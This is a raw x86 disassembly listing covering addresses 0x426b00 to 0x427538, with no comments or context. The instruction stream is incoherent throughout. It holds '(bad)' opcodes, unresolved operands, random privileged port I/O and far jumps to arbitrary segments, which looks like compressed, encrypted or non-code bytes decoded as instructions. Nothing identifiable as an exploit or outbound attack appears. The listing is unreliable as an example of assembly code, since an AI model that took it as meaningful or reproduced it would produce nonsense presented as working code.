  426b00:	loop   0x426adb
  426b02:	in     al,0xc3
  426b04:	and    ah,BYTE PTR [eax]
  426b06:	div    DWORD PTR [edi]
  426b08:	in     eax,0x23
  426b0a:	dec    esi
  426b0b:	adc    edi,eax
  426b0d:	retf   0xd2c7
  426b10:	pop    eax
  426b11:	inc    esp
  426b12:	xchg   ebp,eax
  426b13:	xchg   DWORD PTR [ebx+0x3c],esp
  426b16:	mul    cl
  426b18:	xchg   ecx,eax
  426b19:	test   DWORD PTR [edi],0xb68f92ca
  426b1f:	ja     0x426aba
  426b21:	or     al,0x96
  426b23:	call   0x1ef2a0b1
  426b28:	test   eax,0x68107850
  426b2d:	mov    cl,0xff
  426b2f:	sub    eax,esi
  426b31:	imul   eax,ebx,0xffffff8d
  426b34:	enter  0x186d,0x8d
  426b38:	test   eax,0x2229059e
  426b3d:	jp     0x426b75
  426b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b40:	icebp  
  426b41:	or     edi,0xe05fd17e
  426b47:	(bad)  
  426b48:	or     bh,dh
  426b4a:	pop    ecx
  426b4b:	pop    esi
  426b4c:	cmp    eax,0xdce690a6
  426b51:	repnz mov bl,0x78
  426b54:	mov    bl,0xea
  426b56:	jg     0x426b61
  426b58:	adc    DWORD PTR [edi+0x54],ebp
  426b5b:	jge    0x426b7e
  426b5d:	inc    eax
  426b5e:	pop    edi
  426b5f:	add    dh,bl
  426b61:	shr    BYTE PTR [edx+0x6739bfc],0x1
  426b68:	mov    al,0xab
  426b6a:	push   edx
  426b6b:	sar    BYTE PTR [esi+0x587a4186],cl
  426b71:	jae    0x426b0b
  426b73:	xchg   BYTE PTR [edx+0x63],dh
  426b76:	loope  0x426b76
  426b78:	stc    
  426b79:	pop    edi
  426b7a:	out    0x42,eax
  426b7c:	out    dx,eax
  426b7d:	sti    
  426b7e:	fs addr16 jle 0x426b4b
  426b82:	into   
  426b83:	arpl   cx,sp
  426b85:	sub    eax,0x76b04a3a
  426b8a:	les    esi,FWORD PTR [ecx+0x112e9ef]
  426b90:	retf   0x3b21
  426b93:	mov    al,ds:0xfccfb056
  426b98:	mov    ds:0x942d3ced,eax
  426b9d:	cli    
  426b9e:	push   edi
  426b9f:	dec    edx
  426ba0:	xlat   BYTE PTR ds:[ebx]
  426ba1:	mov    ?,esi
  426ba3:	out    0x2c,eax
  426ba5:	popa   
  426ba6:	aad    0xa6
  426ba8:	and    BYTE PTR [eax+0x3d],bh
  426bab:	pop    esi
  426bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bad:	xor    BYTE PTR [ecx-0x2e],cl
  426bb0:	adc    BYTE PTR [ebp-0x70],ah
  426bb3:	dec    edi
  426bb4:	add    BYTE PTR ds:[eax],al
	...
  426c13:	add    BYTE PTR [eax],al
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	add    al,al
  426c24:	nop
  426c25:	jmp    0x107:0x19d6c
  426c2c:	add    BYTE PTR [eax],al
  426c2e:	xchg   ebx,eax
  426c2f:	div    BYTE PTR [esi]
  426c31:	sbb    ebp,DWORD PTR [ecx+eax*4+0x25]
  426c35:	rcr    DWORD PTR [eax],1
  426c37:	push   esi
  426c38:	dec    ecx
  426c39:	mov    WORD PTR [ecx+ecx*2+0x6f],es
  426c3d:	call   0xa08e2cf2
  426c42:	in     eax,dx
  426c43:	adc    BYTE PTR [edx],bl
  426c45:	jnp    0x426c6d
  426c47:	ret    0x5e62
  426c4a:	and    DWORD PTR [esi+0x6c],eax
  426c4d:	lods   al,BYTE PTR ds:[esi]
  426c4e:	jp     0x426c5e
  426c50:	retf   0xcf92
  426c53:	mov    ah,0x69
  426c55:	sub    BYTE PTR [ebp+ebp*2+0x3c],cl
  426c59:	ret    0x1b64
  426c5c:	mov    edi,0x414f6f27
  426c61:	jae    0x426c13
  426c63:	sub    BYTE PTR [eax],cl
  426c65:	repz cmp ecx,ecx
  426c68:	out    0xc3,al
  426c6a:	pop    eax
  426c6b:	lea    edx,[ebp+0x31]
  426c6e:	cmp    eax,0xbccdc7a8
  426c73:	stos   BYTE PTR es:[edi],al
  426c74:	jbe    0x426c87
  426c76:	lods   al,BYTE PTR ds:[esi]
  426c77:	imul   ebp,DWORD PTR [ecx-0x21],0x99bbe5a
  426c7e:	nop
  426c7f:	cmp    al,BYTE PTR [edi]
  426c81:	xchg   ebx,eax
  426c82:	popa   
  426c83:	push   ebp
  426c84:	lock or DWORD PTR ds:0x15d365e3,edx
  426c8b:	retf   
  426c8c:	addr16 retf 
  426c8e:	adc    al,0x54
  426c90:	adc    bl,BYTE PTR [ebp-0x42]
  426c93:	jge    0x426cbb
  426c95:	lods   al,BYTE PTR ds:[esi]
  426c96:	mov    dl,0xd0
  426c98:	xor    DWORD PTR [ebx+0x357f15c9],esp
  426c9e:	call   0xb285e764
  426ca3:	mov    cl,0x53
  426ca5:	jmp    0x426d23
  426ca7:	leave  
  426ca8:	in     eax,dx
  426ca9:	cld    
  426caa:	dec    ebp
  426cab:	sub    al,0x89
  426cad:	and    edi,ebx
  426caf:	push   eax
  426cb0:	dec    ecx
  426cb1:	inc    ecx
  426cb2:	jae    0x426cf9
  426cb4:	mov    ebx,0xe3670eaa
  426cb9:	or     esi,ecx
  426cbb:	inc    edi
  426cbc:	mov    BYTE PTR [ebp+0x0],ah
  426cbf:	pop    ds
  426cc0:	ret    
  426cc1:	aas    
  426cc2:	inc    ebp
  426cc3:	int3   
  426cc4:	sub    eax,0x623142ab
  426cc9:	scas   al,BYTE PTR es:[edi]
  426cca:	mov    esi,0x781508d0
  426ccf:	ins    DWORD PTR es:[edi],dx
  426cd0:	int    0xba
  426cd2:	mov    BYTE PTR [edi-0x9d6b714],dl
  426cd8:	loop   0x426d52
  426cda:	cmp    ecx,DWORD PTR [ebp-0xaea15f6]
  426ce0:	or     ecx,DWORD PTR [ebx+0xe5fbc8f]
  426ce6:	and    eax,ebp
  426ce8:	or     esi,DWORD PTR ds:0x33152c76
  426cee:	xchg   edx,eax
  426cef:	jmp    0x426d5c
  426cf1:	sahf   
  426cf2:	les    esp,FWORD PTR [ebp+eiz*1+0x578aa044]
  426cf9:	or     esp,DWORD PTR [edx-0x12]
  426cfc:	and    al,ah
  426cfe:	mov    edi,0x361314a8
  426d03:	xor    al,0xca
  426d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d06:	pop    esp
  426d07:	xor    bh,BYTE PTR ds:[edx-0x32a29e9e]
  426d0e:	rol    DWORD PTR [eax],cl
  426d10:	mov    eax,0x8bfb80e5
  426d15:	mov    esi,DWORD PTR [ecx-0x50]
  426d18:	pop    esp
  426d19:	xchg   edi,eax
  426d1a:	stos   BYTE PTR es:[edi],al
  426d1b:	inc    eax
  426d1c:	mov    ecx,0x6cf02aa
  426d21:	mov    ds:0xbe5c025c,eax
  426d26:	mov    bh,0x87
  426d28:	xor    DWORD PTR [ecx-0x65],edx
  426d2b:	jp     0x426d5a
  426d2d:	cdq    
  426d2e:	mov    ebx,0x1f8961b7
  426d33:	loop   0x426d70
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0xbf87:0x7e1b1bf9
  426da3:	(bad)  
  426da5:	xor    al,0x73
  426da7:	sahf   
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [ecx],dh
  426daf:	add    ebx,DWORD PTR [esi]
  426db1:	xor    bl,dl
  426db3:	in     eax,dx
  426db4:	not    DWORD PTR [ebp-0x2c8e926b]
  426dba:	fiadd  DWORD PTR [edi-0x3e]
  426dbd:	enter  0xb1f9,0x2d
  426dc1:	imul   ebp,DWORD PTR [ebx-0x2aed8f1e],0x23
  426dc8:	jl     0x426da7
  426dca:	cwde   
  426dcb:	push   ss
  426dcc:	jo     0x426da3
  426dce:	stos   BYTE PTR es:[edi],al
  426dcf:	xchg   ebx,eax
  426dd0:	sbb    esi,DWORD PTR [ecx]
  426dd2:	dec    edx
  426dd3:	lods   eax,DWORD PTR ds:[esi]
  426dd4:	nop
  426dd5:	or     bl,BYTE PTR [edx+ebx*1-0x44178c47]
  426ddc:	mov    ds:0x26d9ea83,al
  426de1:	adc    DWORD PTR ds:0x650293de,edx
  426de7:	mov    eax,ds:0x99bdb062
  426dec:	sti    
  426ded:	and    eax,0x7ea077e3
  426df2:	push   0xbb59436
  426df7:	pushf  
  426df8:	xor    BYTE PTR [edx+0x78],dh
  426dfb:	xchg   ebp,eax
  426dfc:	cmp    al,BYTE PTR [ebx]
  426dfe:	mov    esi,ecx
  426e00:	and    dh,BYTE PTR [edi]
  426e02:	rcr    BYTE PTR [edx],cl
  426e04:	dec    ecx
  426e05:	jae    0x426dbe
  426e07:	mov    ch,0xa4
  426e09:	(bad)  
  426e0a:	push   ds
  426e0b:	dec    ebp
  426e0c:	into   
  426e0d:	xor    eax,0x7a94dd24
  426e12:	sahf   
  426e13:	mov    al,0x68
  426e15:	sub    ebx,DWORD PTR [edi]
  426e17:	cmp    al,0xb7
  426e19:	mov    eax,ds:0x61805502
  426e1f:	in     eax,0x60
  426e21:	leave  
  426e22:	test   al,0x39
  426e24:	test   DWORD PTR [esi-0x50],esi
  426e27:	pop    es
  426e28:	(bad)  
  426e29:	sti    
  426e2a:	stos   DWORD PTR es:[edi],eax
  426e2b:	xchg   esp,eax
  426e2c:	aad    0x2e
  426e2e:	call   0x3d38:0x5b64db6a
  426e35:	lea    esi,[edi]
  426e37:	cmp    ecx,ecx
  426e39:	shl    edi,1
  426e3b:	pop    esi
  426e3c:	iret   
  426e3d:	leave  
  426e3e:	cmp    eax,0x34401ab2
  426e43:	stos   DWORD PTR es:[edi],eax
  426e44:	or     BYTE PTR [edi+0x3dd7b516],al
  426e4a:	xrelease mov BYTE PTR fs:[ecx-0x51],0x76
  426e50:	and    DWORD PTR [edx+0x2424ecdf],0xffffff9f
  426e57:	scas   al,BYTE PTR es:[edi]
  426e58:	jmp    0x426de3
  426e5a:	(bad)  
  426e5b:	mov    ecx,0x35522eb3
  426e60:	or     cl,ah
  426e62:	ret    
  426e63:	and    ch,BYTE PTR [edx]
  426e65:	icebp  
  426e66:	pop    esp
  426e67:	aas    
  426e68:	lods   al,BYTE PTR ds:[esi]
  426e69:	loop   0x426ee2
  426e6b:	sbb    bh,BYTE PTR [ecx-0x3e]
  426e6e:	test   BYTE PTR [edx-0x6b],0x9b
  426e72:	sti    
  426e73:	mov    ebp,0x944185a6
  426e78:	mov    DWORD PTR [edi+0x332e0ec8],edi
  426e7e:	fstp   QWORD PTR [eax-0x2ba0ad8b]
  426e84:	mov    bh,bl
  426e86:	rcl    DWORD PTR [ecx],cl
  426e88:	clc    
  426e89:	mov    ebp,0x13f3d8de
  426e8e:	mov    esi,0x9aea88f9
  426e93:	fwait
  426e94:	jbe    0x426f09
  426e96:	lods   eax,DWORD PTR ds:[esi]
  426e97:	pushf  
  426e98:	fs into 
  426e9a:	add    esi,DWORD PTR [esi]
  426e9c:	push   ds
  426e9d:	inc    esi
  426e9e:	xlat   BYTE PTR ds:[ebx]
  426e9f:	sub    esp,ecx
  426ea1:	sti    
  426ea2:	or     al,0xa7
  426ea4:	xor    BYTE PTR [ebx],0xa7
  426ea7:	mov    ah,BYTE PTR [edi+0x755f830f]
  426ead:	dec    esp
  426eae:	test   BYTE PTR ds:0xee999383,dh
  426eb4:	das    
	...
  426f15:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx+0x4a3ccda4],ch
  426f25:	inc    edx
  426f26:	jp     0x426ec7
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [ebp-0x4a69a355],dh
  426f33:	add    DWORD PTR [ebx-0x3c],esi
  426f36:	xchg   edi,eax
  426f37:	and    BYTE PTR [esi],ch
  426f39:	or     dh,BYTE PTR [edx-0x51418e13]
  426f3f:	repnz retf 0xf843
  426f43:	mov    eax,0xc36b45a6
  426f48:	mov    ds:0x50a1d2a1,al
  426f4d:	stc    
  426f4e:	aaa    
  426f4f:	fmul   DWORD PTR [edi-0x167a7815]
  426f55:	aas    
  426f56:	not    dl
  426f58:	repnz xchg ebx,eax
  426f5a:	pop    ebx
  426f5b:	xchg   edx,eax
  426f5c:	xor    esi,DWORD PTR [edx]
  426f5e:	pop    edi
  426f5f:	outs   dx,BYTE PTR ds:[esi]
  426f60:	pop    ebx
  426f61:	push   ebp
  426f62:	jmp    0x426fb0
  426f64:	and    BYTE PTR [bx+0x52b7],ch
  426f69:	enter  0x9e29,0xf2
  426f6d:	daa    
  426f6e:	jl     0x426fee
  426f70:	inc    esi
  426f71:	push   es
  426f72:	pop    ds
  426f73:	inc    ebp
  426f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f75:	scas   al,BYTE PTR es:[edi]
  426f76:	xor    dh,BYTE PTR [esi+0x19]
  426f79:	xor    al,0x78
  426f7b:	xor    dh,cl
  426f7d:	push   ecx
  426f7e:	aas    
  426f7f:	add    BYTE PTR [esi-0x5c],al
  426f82:	(bad)  
  426f83:	sahf   
  426f84:	sub    eax,0x5a90b0a3
  426f89:	sbb    eax,0x4c63bf79
  426f8e:	loop   0x426f9d
  426f90:	xchg   BYTE PTR [esi+0x1f],al
  426f93:	mov    esi,0x775f5853
  426f98:	mov    dl,0x34
  426f9a:	shl    BYTE PTR ds:0x38bcec8e,1
  426fa0:	and    al,0x9d
  426fa2:	int    0x87
  426fa4:	in     al,0xba
  426fa6:	addr16 dec edx
  426fa8:	jge    0x426f4b
  426faa:	pop    edi
  426fab:	push   ebp
  426fac:	outs   dx,BYTE PTR ds:[esi]
  426fad:	mov    edx,0xe717bfc3
  426fb2:	out    0xb4,al
  426fb4:	jne    0x426fd4
  426fb6:	out    0xab,eax
  426fb8:	fcom   DWORD PTR [edx]
  426fba:	data16 xor al,0xab
  426fbd:	ins    BYTE PTR es:[edi],dx
  426fbe:	das    
  426fbf:	int3   
  426fc0:	je     0x426f4e
  426fc2:	arpl   si,si
  426fc4:	xor    al,0x54
  426fc6:	and    edx,esi
  426fc8:	stos   BYTE PTR es:[edi],al
  426fc9:	add    BYTE PTR [esi],dh
  426fcb:	in     al,0x59
  426fcd:	pushf  
  426fce:	sbb    al,0xcd
  426fd0:	jnp    0x426fca
  426fd2:	push   ebp
  426fd3:	das    
  426fd4:	enter  0x7d7a,0xbd
  426fd8:	fstp   DWORD PTR [eax]
  426fda:	mov    ds:0x3c5e997d,al
  426fdf:	xchg   ebp,eax
  426fe0:	das    
  426fe1:	data16 xor al,cl
  426fe4:	dec    ebx
  426fe5:	fcmovbe st,st(6)
  426fe7:	out    dx,eax
  426fe8:	cmp    DWORD PTR [ecx-0x71],esi
  426feb:	js     0x426f74
  426fed:	js     0x426f6f
  426fef:	call   0x77ed:0x32c8d896
  426ff6:	inc    eax
  426ff7:	jp     0x426feb
  426ff9:	or     ecx,ebx
  426ffb:	fiadd  WORD PTR [ecx]
  426ffd:	int    0xa6
  426fff:	inc    edi
  427000:	retf   0x5c46
  427003:	xchg   esp,eax
  427004:	ins    DWORD PTR es:[edi],dx
  427005:	jmp    0x1ab2:0xa9d09db6
  42700c:	outs   dx,BYTE PTR ds:[esi]
  42700d:	jmp    0x7e62:0xde0395ed
  427014:	std    
  427015:	sub    ecx,esi
  427017:	fcmovnb st,st(4)
  427019:	daa    
  42701a:	xor    ebp,DWORD PTR [edx-0xf698f9b]
  427020:	enter  0x243f,0x8c
  427024:	stos   BYTE PTR es:[edi],al
  427025:	pop    ebx
  427026:	pop    edx
  427027:	(bad)  
  427028:	daa    
  427029:	ds int3 
  42702b:	or     al,0x7a
  42702d:	and    eax,DWORD PTR [ecx]
  42702f:	pop    ss
  427030:	retf   0x54a7
  427033:	pop    eax
  427034:	mov    WORD PTR [eax],es
	...
  427096:	or     al,0x6d
  427098:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax-0x5443a73a],eax
  4270a5:	mov    BYTE PTR [ecx+0x70001a0],0x1
  4270ac:	add    BYTE PTR [eax],al
  4270ae:	imul   ebx,DWORD PTR [ebx],0xa8a9dff8
  4270b4:	rcl    BYTE PTR [esi-0x77826bcd],0x2e
  4270bb:	aad    0x9c
  4270bd:	das    
  4270be:	in     eax,0x18
  4270c0:	scas   eax,DWORD PTR es:[edi]
  4270c1:	in     al,dx
  4270c2:	inc    edx
  4270c3:	ret    0xd779
  4270c6:	push   esi
  4270c7:	jmp    0x6bfb5e5a
  4270cc:	and    al,0xd8
  4270ce:	retf   0xca19
  4270d1:	fnstenv [esi-0x22]
  4270d4:	out    dx,eax
  4270d5:	out    0xa,eax
  4270d7:	mov    al,0x46
  4270d9:	std    
  4270da:	call   0xbba9:0x40962224
  4270e1:	xchg   ebp,eax
  4270e2:	shl    ecx,cl
  4270e4:	repnz popa 
  4270e6:	inc    ebp
  4270e7:	(bad)  
  4270e8:	mov    edi,0xdb24b249
  4270ed:	mov    al,ds:0x860d8b70
  4270f2:	in     al,0xb
  4270f4:	aaa    
  4270f5:	push   ebx
  4270f6:	es dec ebp
  4270f8:	fmul   QWORD PTR [ebx]
  4270fa:	scas   eax,DWORD PTR es:[edi]
  4270fb:	mov    WORD PTR [edi],?
  4270fd:	(bad)  
  4270fe:	cld    
  4270ff:	or     cl,BYTE PTR [ebp+0x59]
  427102:	push   eax
  427103:	adc    al,0x9
  427105:	adc    DWORD PTR [eax-0x74023017],eax
  42710b:	add    eax,0x5e57385b
  427110:	sub    esi,DWORD PTR [edx-0xacd8f04]
  427116:	je     0x42712a
  427118:	fdivr  QWORD PTR [ebp-0x5a]
  42711b:	xor    eax,0xd0be7a3c
  427120:	push   cs
  427121:	mov    cl,0x7e
  427123:	mul    bh
  427125:	ja     0x4270da
  427127:	jae    0x4270fc
  427129:	hlt    
  42712a:	xchg   ecx,eax
  42712b:	push   edi
  42712c:	fidivr WORD PTR [esi-0x39]
  42712f:	xor    edx,DWORD PTR [ecx+0x4c95c192]
  427135:	mov    WORD PTR [ebx+0x71],ds
  427138:	push   0x6c
  42713a:	fs push ss
  42713c:	adc    DWORD PTR [ecx+edx*4],ecx
  42713f:	iret   
  427140:	cmp    BYTE PTR [eax],0xd6
  427143:	call   0x806a5865
  427148:	stos   BYTE PTR es:[edi],al
  427149:	xor    DWORD PTR [ecx],0xffffff95
  42714c:	add    esp,DWORD PTR [edi-0x556927e4]
  427152:	ret    
  427153:	jo     0x4271c9
  427155:	push   edx
  427156:	test   BYTE PTR [edi+0x6d],dh
  427159:	jge    0x4270e0
  42715b:	rcr    DWORD PTR [ebx+0x157ac35f],cl
  427161:	push   0xffffffde
  427163:	jmp    0x8303:0x4b06d2c2
  42716a:	nop
  42716b:	fwait
  42716c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42716d:	repz push edi
  42716f:	int    0x34
  427171:	rcl    DWORD PTR [esi-0x45],1
  427174:	dec    esp
  427175:	rcr    edx,cl
  427177:	inc    DWORD PTR [edx+0x4d]
  42717a:	and    esp,edx
  42717c:	(bad)  [edx-0x1c]
  42717f:	dec    ebx
  427180:	jge    0x427183
  427182:	mov    ecx,0x87c120da
  427187:	xchg   edx,eax
  427188:	inc    ebx
  427189:	dec    esi
  42718a:	add    bh,al
  42718c:	stos   DWORD PTR es:[edi],eax
  42718d:	mov    esi,DWORD PTR [edx+edi*2]
  427190:	or     ebp,DWORD PTR [edx+0x7d71e92e]
  427196:	fcom   QWORD PTR [edx]
  427198:	add    eax,0x2f838b44
  42719d:	xchg   BYTE PTR [ebx+0x2f],al
  4271a0:	stos   BYTE PTR es:[edi],al
  4271a1:	leave  
  4271a2:	rcr    BYTE PTR [eax+esi*2+0x26],0xf3
  4271a7:	or     cl,BYTE PTR [esi+0x5c]
  4271aa:	into   
  4271ab:	jae    0x42712d
  4271ad:	sahf   
  4271ae:	sar    ebp,1
  4271b0:	loop   0x4271ac
  4271b2:	stos   DWORD PTR es:[edi],eax
  4271b3:	out    0x18,eax
	...
  427215:	add    BYTE PTR [esi],bl
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x27a30100
  427224:	stc    
  427225:	add    ecx,DWORD PTR [eax+0x70001a1]
  42722b:	add    DWORD PTR [eax],eax
  42722d:	add    BYTE PTR [ebp+0x7f],cl
  427230:	or     al,0xda
  427232:	int    0x6b
  427234:	sub    edi,edi
  427236:	(bad)  
  427237:	dec    edi
  427238:	cmp    esi,DWORD PTR [esi-0x7e]
  42723b:	and    ah,BYTE PTR [edi]
  42723d:	pop    ss
  42723e:	dec    dx
  427240:	imul   edx,edx,0x119030d4
  427246:	sbb    eax,0x6fa8a88d
  42724b:	or     cl,BYTE PTR [ebp+0x33ed563d]
  427251:	sub    bl,BYTE PTR [edx+ebp*1-0x65cae366]
  427258:	(bad)  
  42725a:	pop    ds
  42725b:	fucomip st,st(3)
  42725d:	(bad)  
  42725e:	(bad)  
  42725f:	in     eax,dx
  427260:	out    dx,eax
  427261:	mov    cl,0x31
  427263:	mov    bh,0x3b
  427265:	inc    ebx
  427266:	ds xchg ebp,eax
  427268:	lahf   
  427269:	adc    ebx,DWORD PTR [esi+0x7f]
  42726c:	loop   0x42727f
  42726e:	add    DWORD PTR [edi],eax
  427270:	and    ch,bh
  427272:	ret    
  427273:	cdq    
  427274:	add    eax,0xf10d37d3
  427279:	jl     0x42724f
  42727b:	aas    
  42727c:	pop    ebp
  42727d:	push   edi
  42727e:	das    
  42727f:	pop    ebx
  427280:	sbb    al,0xf6
  427282:	pusha  
  427283:	add    eax,0x5e15b6c9
  427288:	(bad)  
  427289:	fdiv   DWORD PTR [ebx+0x17]
  42728c:	jbe    0x4272f2
  42728e:	dec    ecx
  42728f:	mov    ds:0x48dcee0a,eax
  427294:	mov    dl,0x1d
  427296:	mov    BYTE PTR [edx],ch
  427298:	add    eax,ebx
  42729a:	scas   eax,DWORD PTR es:[edi]
  42729b:	mul    ebx
  42729d:	pop    eax
  42729e:	dec    eax
  42729f:	(bad)  
  4272a0:	cmc    
  4272a1:	dec    eax
  4272a2:	daa    
  4272a3:	jnp    0x4272c6
  4272a5:	stc    
  4272a6:	out    0x33,al
  4272a8:	sbb    eax,DWORD PTR [ebp-0x5885be13]
  4272ae:	mov    bl,0xaa
  4272b0:	jmp    0xbac643f9
  4272b5:	into   
  4272b6:	out    dx,eax
  4272b7:	add    al,0x36
  4272b9:	idiv   BYTE PTR [eax-0x5cb2996e]
  4272bf:	(bad)  [esi+0x6b]
  4272c2:	ins    DWORD PTR es:[edi],dx
  4272c3:	add    al,0xa5
  4272c5:	or     ah,dl
  4272c7:	outs   dx,DWORD PTR ds:[esi]
  4272c8:	cmp    esp,ecx
  4272ca:	call   DWORD PTR [esi+ebx*8+0x26]
  4272ce:	jmp    0x84503683
  4272d3:	mov    DWORD PTR [esi-0xb],ebx
  4272d6:	or     al,0xde
  4272d8:	jb     0x4272fd
  4272da:	(bad)  
  4272db:	and    eax,edi
  4272dd:	xchg   ebp,eax
  4272de:	and    BYTE PTR [ebx+0x56],bh
  4272e1:	mov    dh,0xf6
  4272e3:	pop    ecx
  4272e4:	outs   dx,BYTE PTR ds:[esi]
  4272e5:	push   ebp
  4272e6:	push   esp
  4272e7:	loopne 0x427355
  4272e9:	aad    0x82
  4272eb:	and    eax,0x7d28203b
  4272f0:	sti    
  4272f1:	fldcw  WORD PTR [ebx+edx*2]
  4272f4:	call   0x271f:0x4de6edae
  4272fb:	and    DWORD PTR cs:[ebx+0x4dab49df],esp
  427302:	cli    
  427303:	inc    eax
  427304:	mov    esp,0xb69588b6
  427309:	fwait
  42730a:	retf   0x9af2
  42730d:	popf   
  42730e:	push   0x3dd4dfbd
  427313:	loope  0x42738c
  427315:	aas    
  427316:	nop
  427317:	retf   0xb4b2
  42731a:	adc    DWORD PTR [eax+0x5e],ecx
  42731d:	cmp    eax,0x10665394
  427322:	lock sbb BYTE PTR [ecx-0x12748306],bl
  427329:	cmp    al,0x3
  42732b:	xchg   esi,eax
  42732c:	mov    fs,ebx
  42732e:	dec    edx
  42732f:	xor    dh,dl
  427331:	retf   0x382a
  427334:	imul   eax,DWORD PTR [eax],0x0
	...
  427396:	adc    bl,BYTE PTR ds:0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	cmp    eax,0x8fca7cdc
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	mov    gs,WORD PTR [esi+0x77]
  4273b1:	repz jmp 0xcdee:0x48451d73
  4273b9:	frndint 
  4273bb:	add    dl,BYTE PTR [eax-0x80]
  4273be:	sbb    dh,BYTE PTR [ecx-0x71]
  4273c1:	fcmovu st,st(2)
  4273c3:	adc    eax,0x81cabff7
  4273c8:	popa   
  4273c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273ca:	std    
  4273cb:	sbb    BYTE PTR [edx],ch
  4273cd:	imul   esi,DWORD PTR [esi],0xc3a3a74
  4273d3:	dec    edi
  4273d4:	dec    esp
  4273d5:	fst    QWORD PTR [ebx+eax*8+0x69831052]
  4273dc:	adc    BYTE PTR [esi-0x6188c332],al
  4273e2:	popa   
  4273e3:	mov    dl,0x61
  4273e5:	jbe    0x4273e6
  4273e7:	inc    esi
  4273e8:	mov    edx,DWORD PTR [ecx+0x3a]
  4273eb:	lods   eax,DWORD PTR ds:[esi]
  4273ec:	lds    esi,FWORD PTR [esi]
  4273ee:	mov    ebp,eax
  4273f0:	dec    esi
  4273f1:	stos   DWORD PTR es:[edi],eax
  4273f2:	or     eax,esi
  4273f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273f5:	mov    dl,0x50
  4273f7:	test   BYTE PTR [ecx-0x36],al
  4273fa:	scas   al,BYTE PTR es:[edi]
  4273fb:	mov    ebx,0xf82eccae
  427400:	cmp    eax,edx
  427402:	out    0x6f,al
  427404:	idiv   DWORD PTR [edx]
  427406:	test   DWORD PTR [edi],esi
  427408:	inc    edx
  427409:	dec    esi
  42740a:	pop    eax
  42740b:	mov    bl,BYTE PTR [esp+eax*1-0x32]
  42740f:	call   0xf906:0x18f2060f
  427416:	pop    ds
  427417:	mov    ch,0x4f
  427419:	adc    eax,0xe34ecfbc
  42741e:	push   cs
  42741f:	add    BYTE PTR [esi+0x18fded80],ch
  427425:	arpl   WORD PTR ds:0x15f29ecc,di
  42742b:	xchg   ecx,eax
  42742c:	mov    dl,0x59
  42742e:	inc    ecx
  42742f:	mov    WORD PTR [eax+0x3e],ds
  427432:	xchg   ebx,eax
  427433:	dec    edi
  427434:	push   edx
  427435:	mov    al,0x85
  427437:	push   0xffffffd4
  427439:	dec    esi
  42743a:	fsub   st,st(2)
  42743c:	lds    bx,DWORD PTR [edi+0x46]
  427440:	sbb    al,0x1c
  427442:	mov    ebx,0x9d0f1f9c
  427447:	lea    ebx,[esi+0x7202e8bd]
  42744d:	retf   0xc3e7
  427450:	pop    ebp
  427451:	sbb    BYTE PTR [ebp-0x5c],bl
  427454:	adc    edi,DWORD PTR [esi-0x23]
  427457:	fwait
  427458:	push   ss
  427459:	hlt    
  42745a:	dec    ecx
  42745b:	sub    DWORD PTR [ebx+0x55],esp
  42745e:	mov    ss,WORD PTR [edi+eiz*1]
  427461:	push   es
  427462:	pushf  
  427463:	push   eax
  427464:	inc    ebx
  427465:	jl     0x7fb91d1f
  42746b:	push   eax
  42746c:	in     eax,dx
  42746d:	pop    eax
  42746e:	rol    dl,0xbb
  427471:	loopne 0x4274dd
  427473:	cwde   
  427474:	ins    DWORD PTR es:[edi],dx
  427475:	int    0xff
  427477:	fldcw  WORD PTR [edx-0x3]
  42747a:	push   esi
  42747b:	sbb    al,0xbd
  42747d:	sbb    edx,DWORD PTR [ebp+0x5bb8c07c]
  427483:	xchg   DWORD PTR [ecx+0x12],ecx
  427486:	icebp  
  427487:	das    
  427488:	adc    al,0xa7
  42748a:	xchg   ecx,ecx
  42748c:	pop    ss
  42748d:	loope  0x4274e5
  42748f:	mov    DWORD PTR [ecx+0x17ad2923],esp
  427495:	or     esp,DWORD PTR [esi+eax*1]
  427498:	int    0x17
  42749a:	add    esi,ebx
  42749c:	xchg   BYTE PTR [ebx+0x42],dh
  42749f:	lods   al,BYTE PTR ds:[esi]
  4274a0:	repnz or eax,0x74125fbf
  4274a6:	add    BYTE PTR [ebx+0x74],bh
  4274a9:	xchg   ebx,eax
  4274aa:	in     eax,0x72
  4274ac:	loope  0x42743a
  4274ae:	xchg   esp,eax
  4274af:	ret    0x4147
  4274b2:	sbb    edi,0x6c
	...
  427514:	add    BYTE PTR [eax],al
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x60a6f50a]
  427523:	outs   dx,DWORD PTR ds:[esi]
  427524:	loope  0x427513
  427526:	xchg   esi,eax
  427527:	mov    ds:0x1070001,eax
  42752c:	add    BYTE PTR [eax],al
  42752e:	pop    ebp
  42752f:	sti    
  427530:	cmp    DWORD PTR [eax-0x10],esi
  427533:	pop    esp
  427534:	lahf   
  427535:	leave  
  427536:	sub    al,0x70
  427538:	aas    
